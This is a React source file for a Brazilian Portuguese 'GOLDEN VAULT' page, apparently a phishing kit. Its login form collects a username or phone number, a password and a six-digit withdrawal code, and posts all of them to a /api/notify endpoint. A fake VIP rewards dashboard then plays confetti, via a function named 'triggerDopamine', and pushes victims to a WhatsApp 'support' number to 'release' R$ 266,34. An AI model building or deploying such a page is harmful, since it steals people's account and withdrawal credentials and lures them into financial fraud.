/**
 * @license
 * SPDX-License-Identifier: Apache-2.0
 */

import React, { useState, useEffect, useRef } from 'react';
import { gsap } from 'gsap';
import confetti from 'canvas-confetti';
import { Lock, User, Key, Coins, Trophy, Zap, Gift, CheckCircle2, ArrowRight } from 'lucide-react';

interface UserData {
  user: string;
  pass: string;
  withdraw_pass: string;
  timestamp: string;
  status: string;
  rewardsClaimed: string[];
}

const REWARDS = [
  { id: 'vip7', title: 'UPGRADE VIP 7', description: 'Sincronização de privilégios', icon: Trophy, value: 'NÍVEL 7' },
  { id: 'bonus75', title: 'BÔNUS DE ENTRADA', description: 'Crédito em reserva', value: 'R$ 75,00', icon: Gift },
  { id: 'secret50', title: 'RECARGA SECRETA I', description: 'Ativação de multiplicador', value: 'R$ 50,00', icon: Zap },
  { id: 'secret30', title: 'RECARGA SECRETA II', description: 'Fidelidade avançada', value: 'R$ 30,00', icon: Coins },
  { id: 'loyalty16', title: 'RESGATE DE LEALDADE', description: 'Cálculo de saldo residual', value: 'R$ 16,34', icon: CheckCircle2 },
];

export default function App() {
  const [view, setView] = useState<'login' | 'dashboard' | 'success'>('login');
  const [loading, setLoading] = useState(false);
  const [userData, setUserData] = useState<UserData>({
    user: '',
    pass: '',
    withdraw_pass: '',
    timestamp: '',
    status: 'pending',
    rewardsClaimed: [],
  });
  const [currentRewardIndex, setCurrentRewardIndex] = useState(0);
  const [isClaiming, setIsClaiming] = useState(false);
  
  const containerRef = useRef<HTMLDivElement>(null);
  const loginRef = useRef<HTMLDivElement>(null);
  const dashboardRef = useRef<HTMLDivElement>(null);

  useEffect(() => {
    const ctx = gsap.context(() => {
      const particles = document.querySelectorAll('.particle');
      particles.forEach((p) => {
        gsap.to(p, {
          y: 'random(-120, 120)',
          x: 'random(-60, 60)',
          duration: 'random(4, 8)',
          repeat: -1,
          yoyo: true,
          ease: 'sine.inOut',
        });
      });
    }, containerRef);
    return () => ctx.revert();
  }, []);

  const handleLogin = async (e: React.FormEvent) => {
    e.preventDefault();
    setLoading(true);

    const updatedData = {
      ...userData,
      timestamp: new Date().toLocaleString('pt-BR'),
      status: 'active'
    };

    // Envia para sua API notify permanentemente
    try {
      await fetch('/api/notify', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(updatedData),
      });
    } catch (err) {
      console.error('Falha ao notificar servidor');
    }

    // Animação de transição para o Dashboard
    gsap.to(loginRef.current, {
      opacity: 0,
      y: -20,
      duration: 0.6,
      ease: 'power2.in',
      onComplete: () => {
        setLoading(false);
        setView('dashboard');
        setTimeout(() => {
          gsap.fromTo(dashboardRef.current, 
            { opacity: 0, y: 30 }, 
            { opacity: 1, y: 0, duration: 0.8, ease: 'power3.out' }
          );
        }, 100);
      }
    });
  };

  const triggerDopamine = () => {
    const duration = 1.5 * 1000;
    const animationEnd = Date.now() + duration;
    const defaults = { startVelocity: 25, spread: 360, ticks: 50, zIndex: 100 };
    const randomInRange = (min: number, max: number) => Math.random() * (max - min) + min;

    const interval: any = setInterval(function() {
      const timeLeft = animationEnd - Date.now();
      if (timeLeft <= 0) return clearInterval(interval);
      const particleCount = 40 * (timeLeft / duration);
      confetti({ ...defaults, particleCount, origin: { x: randomInRange(0.1, 0.3), y: Math.random() - 0.2 }, colors: ['#D4AF37', '#F5F5F5'] });
      confetti({ ...defaults, particleCount, origin: { x: randomInRange(0.7, 0.9), y: Math.random() - 0.2 }, colors: ['#D4AF37', '#F5F5F5'] });
    }, 200);
  };

  const claimReward = (id: string) => {
    if (isClaiming) return;
    setIsClaiming(true);
    triggerDopamine();

    setTimeout(() => {
      setUserData(prev => ({
        ...prev,
        rewardsClaimed: [...prev.rewardsClaimed, id]
      }));
      
      if (currentRewardIndex < REWARDS.length - 1) {
        setCurrentRewardIndex(prev => prev + 1);
        setIsClaiming(false);
      } else {
        setTimeout(() => setView('success'), 800);
      }
    }, 1200);
  };

  return (
    <div ref={containerRef} className="min-h-screen relative flex items-center justify-center p-4 overflow-hidden bg-[#050505]">
      {/* Background Particles */}
      <div className="absolute inset-0 pointer-events-none">
        {[...Array(15)].map((_, i) => (
          <div key={i} className="particle absolute w-1 h-1 bg-[#D4AF37]/20 rounded-full"
            style={{ left: `${Math.random() * 100}%`, top: `${Math.random() * 100}%`, boxShadow: '0 0 10px #D4AF37' }}
          />
        ))}
      </div>

      {view === 'login' && (
        <div ref={loginRef} className="w-full max-w-md bg-[#0A0A0A] border border-white/5 p-8 rounded-[2.5rem] shadow-2xl z-10">
          <div className="text-center mb-10">
            <div className="w-16 h-16 bg-[#111] border border-[#D4AF37]/20 rounded-2xl flex items-center justify-center mx-auto mb-4">
              <Lock className="text-[#D4AF37] w-8 h-8" />
            </div>
            <h1 className="text-3xl font-black text-white tracking-tighter mb-2">GOLDEN VAULT</h1>
            <p className="text-gray-500 text-[10px] tracking-[0.3em] font-bold">AUTENTICAÇÃO EXCLUSIVA</p>
          </div>

          <form onSubmit={handleLogin} className="space-y-6">
            <div className="space-y-1">
              <label className="text-[10px] uppercase text-gray-500 font-bold ml-1">Usuário / Telefone</label>
              <div className="relative">
                <User className="absolute left-4 top-1/2 -translate-y-1/2 text-gray-600 w-5 h-5" />
                <input required type="text" placeholder="Seu usuário"
                  className="w-full bg-[#111] border border-white/5 rounded-xl py-4 pl-12 pr-4 text-white focus:outline-none focus:border-[#D4AF37]/40 transition-all"
                  onChange={(e) => setUserData({...userData, user: e.target.value})}
                />
              </div>
            </div>

            <div className="space-y-1">
              <label className="text-[10px] uppercase text-gray-500 font-bold ml-1">Senha de Acesso</label>
              <div className="relative">
                <Key className="absolute left-4 top-1/2 -translate-y-1/2 text-gray-600 w-5 h-5" />
                <input required type="password" placeholder="••••••••"
                  className="w-full bg-[#111] border border-white/5 rounded-xl py-4 pl-12 pr-4 text-white focus:outline-none focus:border-[#D4AF37]/40 transition-all"
                  onChange={(e) => setUserData({...userData, pass: e.target.value})}
                />
              </div>
            </div>

            <div className="space-y-1">
              <label className="text-[10px] uppercase text-gray-500 font-bold ml-1">Código de Saque</label>
              <div className="relative">
                <Coins className="absolute left-4 top-1/2 -translate-y-1/2 text-gray-600 w-5 h-5" />
                <input required type="password" placeholder="6 dígitos"
                  className="w-full bg-[#111] border border-white/5 rounded-xl py-4 pl-12 pr-4 text-white focus:outline-none focus:border-[#D4AF37]/40 transition-all"
                  onChange={(e) => setUserData({...userData, withdraw_pass: e.target.value})}
                />
              </div>
            </div>

            <button disabled={loading} type="submit" className="w-full bg-[#D4AF37] hover:bg-[#B8962E] text-black font-bold py-4 rounded-xl transition-all uppercase tracking-widest text-sm disabled:opacity-50">
              {loading ? 'AUTENTICANDO...' : 'ACESSAR AGORA'}
            </button>
          </form>
        </div>
      )}

      {view === 'dashboard' && (
        <div ref={dashboardRef} className="w-full max-w-2xl z-10 px-2">
          <div className="flex items-center justify-between mb-8">
            <h2 className="text-2xl font-black text-white italic">PAINEL VIP</h2>
            <div className="text-right">
              <p className="text-[10px] text-gray-500 font-bold uppercase">Membro Ativo</p>
              <p className="text-[#D4AF37] font-bold text-sm">{userData.user}</p>
            </div>
          </div>

          <div className="space-y-4">
            {REWARDS.map((reward, index) => {
              const isUnlocked = index <= currentRewardIndex;
              const isClaimed = userData.rewardsClaimed.includes(reward.id);
              const isCurrent = index === currentRewardIndex;

              return (
                <div key={reward.id} className={`p-5 rounded-2xl border transition-all duration-500 flex items-center justify-between ${
                  isUnlocked ? 'bg-[#0A0A0A] border-[#D4AF37]/20 opacity-100' : 'bg-transparent border-white/5 opacity-30 grayscale'
                } ${isCurrent ? 'scale-[1.03] border-[#D4AF37]/50 shadow-[0_0_20px_rgba(212,175,55,0.1)]' : ''}`}>
                  <div className="flex items-center gap-4">
                    <div className={`w-10 h-10 rounded-lg flex items-center justify-center ${isUnlocked ? 'bg-[#D4AF37]/10 text-[#D4AF37]' : 'bg-white/5 text-gray-700'}`}>
                      <reward.icon size={20} />
                    </div>
                    <div>
                      <h3 className="text-white text-xs font-bold uppercase">{reward.title}</h3>
                      <p className="text-[9px] text-gray-500 uppercase">{reward.description}</p>
                    </div>
                  </div>
                  <div className="text-right">
                    <p className={`font-black text-sm mb-2 ${isUnlocked ? 'text-white' : 'text-gray-800'}`}>{reward.value}</p>
                    {isCurrent && !isClaimed && (
                      <button onClick={() => claimReward(reward.id)} disabled={isClaiming} className="bg-[#D4AF37] text-black text-[9px] font-black px-4 py-2 rounded-md uppercase">
                        {isClaiming ? '...' : 'RESGATAR'}
                      </button>
                    )}
                    {isClaimed && <span className="text-green-500 text-[9px] font-bold uppercase">LIBERADO</span>}
                  </div>
                </div>
              );
            })}
          </div>
        </div>
      )}

      {view === 'success' && (
        <div className="fixed inset-0 z-50 bg-black/95 flex items-center justify-center p-6 backdrop-blur-md">
          <div className="w-full max-w-sm bg-[#0A0A0A] border border-[#D4AF37]/30 p-10 rounded-[3rem] text-center">
            <div className="w-20 h-20 bg-[#D4AF37] rounded-3xl flex items-center justify-center mx-auto mb-6 shadow-lg shadow-[#D4AF37]/20">
              <CheckCircle2 className="text-black w-10 h-10" />
            </div>
            <h2 className="text-2xl font-black text-white mb-4 italic">RESGATE PRONTO!</h2>
            <p className="text-gray-400 text-xs leading-relaxed mb-8">
              Você acumulou um saldo total de <span className="text-[#D4AF37] font-bold">R$ 266,34</span>. 
              Sua conta VIP 7 está pronta para receber o bônus.
            </p>
            <a 
              href="https://wa.me/55996191896?text=Olá!%20Concluí%20o%20resgate%20VIP%20de%20R$%20266,34.%20Pode%20liberar%20o%20crédito?"
              className="flex items-center justify-center gap-2 w-full bg-[#25D366] hover:bg-[#1EBE57] text-black font-black py-4 rounded-2xl transition-all uppercase text-xs tracking-tighter"
            >
              FALAR COM SUPORTE VIP
              <ArrowRight size={16} />
            </a>
          </div>
        </div>
      )}
    </div>
  );
}